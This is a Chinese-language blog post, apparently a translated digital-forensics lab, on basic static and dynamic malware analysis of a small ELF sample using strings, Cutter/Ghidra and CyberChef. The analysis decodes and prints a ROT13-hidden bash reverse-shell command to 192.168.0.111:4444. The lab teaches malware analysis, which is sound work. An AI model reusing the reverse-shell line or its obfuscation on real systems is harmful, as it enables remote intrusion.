@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>digital-forensics-lab-cn-Lab07</title>
+<meta name="keywords" content="digital-forensics-lab-cn-Lab07, 0x783kb,threathunting">
+<meta name="description" content="恶意软件分析恶意软件，简称为malware，是一个用来描述对用户、计算机、网络或设备造成损害或伤害的任何软件的术语。恶意软件可以采取多种形式，包括病毒、特洛伊木马、蠕虫、间谍软件、广告软件和勒索软件。
+随着对技术和互联网的依赖日益增加，恶意">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="digital-forensics-lab-cn-Lab07">
+<meta property="og:description" content="恶意软件分析恶意软件，简称为malware，是一个用来描述对用户、计算机、网络或设备造成损害或伤害的任何软件的术语。恶意软件可以采取多种形式，包括病毒、特洛伊木马、蠕虫、间谍软件、广告软件和勒索软件。
+随着对技术和互联网的依赖日益增加，恶意">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <meta name="generator" content="Hexo 7.1.1"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://example.com">
+        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
+      </a>
+      <a href="http://example.com">
+        <h1 class="site-title">0x783kb</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/archives" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">digital-forensics-lab-cn-Lab07</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2024-04-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/digital-forensics-lab-cn/">
+              digital-forensics-lab-cn
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h1 id="恶意软件分析"><a href="#恶意软件分析" class="headerlink" title="恶意软件分析"></a>恶意软件分析</h1><p>恶意软件，简称为malware，是一个用来描述对用户、计算机、网络或设备造成损害或伤害的任何软件的术语。恶意软件可以采取多种形式，包括病毒、特洛伊木马、蠕虫、间谍软件、广告软件和勒索软件。</p>
+<p>随着对技术和互联网的依赖日益增加，恶意软件已经成为对个人和组织都普遍存在的威胁，导致经济损失、数据泄露和系统损害。因此，恶意软件分析已经成为数字取证中的一项关键技能，帮助识别和减轻这些威胁。</p>
+<p>这个实验室作为介绍用于分析和理解恶意软件功能和行为的不同技术和工具的入门。</p>
+<h2 id="什么是恶意软件分析？"><a href="#什么是恶意软件分析？" class="headerlink" title="什么是恶意软件分析？"></a>什么是恶意软件分析？</h2><p>引用书籍《Practical Malware Analysis》（实用恶意软件分析）中的话：</p>
+<p>恶意软件分析是解剖恶意软件以理解其工作原理、如何识别它以及如何击败或消除它的艺术。而且，你不需要成为一个超级黑客就能进行恶意软件分析。</p>
+<p>简单来说，恶意软件分析是对恶意软件进行分析和理解的过程，以识别其行为、特征以及对系统的潜在影响。</p>
+<p>在分析恶意软件时，我们可以采取两种方法：静态分析和动态分析。</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>静态分析涉及检查二进制代码、反汇编代码和逆向工程。静态分析的目标是获得高层次的抽象，并确定代码是否可能具有恶意。它对于识别已知的恶意软件家族以及开发防病毒签名和其他检测方法非常有用。</p>
+<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>动态分析是通过在隔离环境中执行恶意软件并观察其行为来分析恶意软件的方法，例如监视它所做的系统调用、它建立的网络连接以及它在系统内的其他交互。它特别有助于理解恶意软件如何与系统交互以及它被设计来做什么。</p>
+<p>💡 这两种方法之间的关键区别在于，静态分析涉及在不执行恶意软件的情况下检查其代码，而动态分析涉及在隔离环境中运行恶意软件以观察其行为。</p>
+<h2 id="实践操作"><a href="#实践操作" class="headerlink" title="实践操作"></a>实践操作</h2><p>现在我们已经对静态和动态分析有了基本的了解，让我们在实践中尝试它们。我们将要分析的二进制文件本质上是可在 <a target="_blank" rel="noopener" href="https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab">https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab</a> 07&#x2F;files&#x2F;main.c 找到的C代码的编译版本。</p>
+<p>要开始，我们可以使用以下命令下载编译后的二进制文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vonderchild/digital-forensics-lab/raw/main/Lab%2007/files/main</span><br></pre></td></tr></table></figure>
+
+<h3 id="初始分析"><a href="#初始分析" class="headerlink" title="初始分析"></a>初始分析</h3><p>在我们开始对二进制文件进行详细分析之前，重要的是要识别我们正在处理的文件类型，并提取像嵌入的URL、硬编码的IP地址或包含可疑关键字的字符串这样的明显信息。</p>
+<p>为了识别我们正在处理的文件类型，让我们运行文件命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file main</span><br><span class="line">main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba2f226142eb8b7032264aab8c3386d1487bcb17, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>它看起来这个二进制文件是使用GNU编译器编译的。让我们使用strings命令从二进制文件中提取所有人类可读的字符串：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ strings main </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">onfu -p H</span><br><span class="line"><span class="string">&#x27;onfu -vH</span></span><br><span class="line"><span class="string"> &gt;&amp; /qriH</span></span><br><span class="line"><span class="string">/gpc/192H</span></span><br><span class="line"><span class="string">.168.0.1H</span></span><br><span class="line"><span class="string">11/4444 H</span></span><br><span class="line"><span class="string">0&gt;&amp;1f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;SNIP&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正如我们所见，一些提取出的字符串包含了IP地址192.168.0.111的一部分。</p>
+<p>在初始分析期间经常使用的其他技术包括检查文件是否被打包或压缩，以及在VirusTotal等平台上搜索文件签名，以查看该文件是否已经被分析过。</p>
+<p>💡 VirusTotal是一个平台，允许我们分析可疑的文件、域名、IP地址和URL，以检测和分析恶意软件，并自动将其与安全社区共享。</p>
+<h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><p>对于静态分析，我们将使用Cutter，这是一个可以反汇编和反编译二进制文件的逆向工程工具。Cutter还提供了一个用于动态分析的调试器，尽管截至撰写本文时，它仍处于测试阶段。</p>
+<p>要下载并运行Cutter，请执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/rizinorg/cutter/releases/download/v2.2.0/Cutter-v2.2.0-Linux-x86_64.AppImage</span><br><span class="line"><span class="built_in">chmod</span> +x Cutter-v2.2.0-Linux-x86_64.AppImage</span><br><span class="line">./Cutter-v2.2.0-Linux-x86_64.AppImage --appimage-extract</span><br><span class="line">./squashfs-root/AppRun</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在应用程序启动后(可选择中文，选择中文后，点击关闭，再次打开，即显示中文)，点击“选择”，并打开你之前下载的主二进制文件：</p>
+</li>
+<li><p>在此之后，点击“打开”，在“加载选项”窗口中，点击“确定”。</p>
+</li>
+<li><p>这应该会带您到显示我们正在分析的二进制文件概览的仪表板标签页，包括其格式、文件类型、编程语言、架构和哈希值。</p>
+</li>
+<li><p>要检查函数的代码，我们可以在左侧窗格中双击函数名称，它应该会显示代码的反汇编版本。</p>
+</li>
+<li><p>要查看同一函数的反编译 C 代码，请从底部窗格中选择 Decompile，然后从右下角选择 Ghidra。</p>
+</li>
+</ul>
+<p>似乎 main 函数从声明一些变量开始，然后为它们分配一些值并调用 caesar_decode 函数，之后 system 函数被调用，然后最终返回 main 函数。</p>
+<p>🚧 反编译的代码可能看起来比原始源代码更复杂，因为它缺少原始源代码中的高级抽象、注释和变量名称，使其更难理解。</p>
+<p>现在让我们来看看 caesar_decode。</p>
+<p>顾名思义， caesar_decode 将 input 指针指向 char type 和 type 键 int，然后它通过遍历数组并利用凯撒密码来解码数组。</p>
+<p>在 main 函数中，我们看到 caesar_decode 使用两个参数调用 — 指向字符串的指针和 0xd，翻译为 13 十进制。</p>
+<p>因此，我们可以推断 Caesar 密码中使用的密钥是 13，我们可以使用 CyberChef 从字符串的十六进制表示中解码： </p>
+<p>这表明字符串 bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.111&#x2F;4444’ 0&gt;&amp;1 作为输入传递给 system 函数，然后执行它以建立反向 shell 连接。 </p>
+<h3 id="动态分析-1"><a href="#动态分析-1" class="headerlink" title="动态分析"></a>动态分析</h3><p>对于动态分析，我们可以利用以下工具 strace 或 ltrace 监视二进制文件在运行时进行的系统调用和库调用。此外，我们还可以使用以下工具 Wireshark 或 tcpdump 监视二进制文件生成的网络流量。</p>
+<p>在backbox环境下，使用上述命令进行模拟，未实现分析效果。</p>
+<p>虽然我们特定的二进制文件似乎没有进行任何库调用，但这种技术通常很有用。</p>
+<p>执行动态分析的另一种方法是使用 Wireshark 监控网络流量。为此，我们可以开始捕获数据包，然后执行二进制文件。这将使我们能够观察二进制文件建立的任何网络连接，并分析正在发送和接收的数据。</p>
+<p><strong>可以使用沙箱进行模拟，捕获终端系统调用及库的调用，也可以捕获网络行为</strong></p>
+<h2 id="使用VirusTotal"><a href="#使用VirusTotal" class="headerlink" title="使用VirusTotal"></a>使用VirusTotal</h2><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>总之，我们已经探索了恶意软件分析的基础知识，并学习了如何使用一些基本技术进行静态分析和动态分析。然而，需要注意的是，还有许多其他可用的工具，例如：</p>
+<ul>
+<li>Ghidra</li>
+<li>Radare2</li>
+<li>IDA</li>
+<li>GDB</li>
+<li>Procmon</li>
+<li>Process Hacker</li>
+</ul>
+<p>这些工具具有多种功能，可以帮助进行恶意软件分析，并提供对恶意软件行为的更深入的洞察。例如，Ghidra是一个强大的逆向工程工具，可以用来反汇编和反编译二进制文件。Radare2是一个支持多种架构和文件格式的开源逆向工程框架。IDA是一个流行的反汇编器和调试器，提供交叉引用和函数签名等高级功能。GDB是Linux系统广泛使用的调试器，允许对运行中的程序进行低级调试。Procmon和Process Hacker可以用来实时监控系统活动，这对于检测试图隐藏其活动的恶意软件非常有用。</p>
+<p>虽然我们在这个实验室中只触及了恶意软件分析的皮毛，但重要的是要注意，还有许多更先进的工具和方法论可以探索。</p>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90"><span class="top-box-text">恶意软件分析</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%EF%BC%9F"><span class="top-box-text">什么是恶意软件分析？</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="top-box-text">静态分析</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="top-box-text">动态分析</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%AE%9E%E8%B7%B5%E6%93%8D%E4%BD%9C"><span class="top-box-text">实践操作</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%88%9D%E5%A7%8B%E5%88%86%E6%9E%90"><span class="top-box-text">初始分析</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-1"><span class="top-box-text">静态分析</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90-1"><span class="top-box-text">动态分析</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BD%BF%E7%94%A8VirusTotal"><span class="top-box-text">使用VirusTotal</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E7%BB%93%E8%AE%BA"><span class="top-box-text">结论</span></a></li></ol></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2024/04/28/digital-forensics-lab-cn-Lab06/">
+          <h3 class="post-title">
+            下一篇：digital-forensics-lab-cn-Lab06
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/0x783kb" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
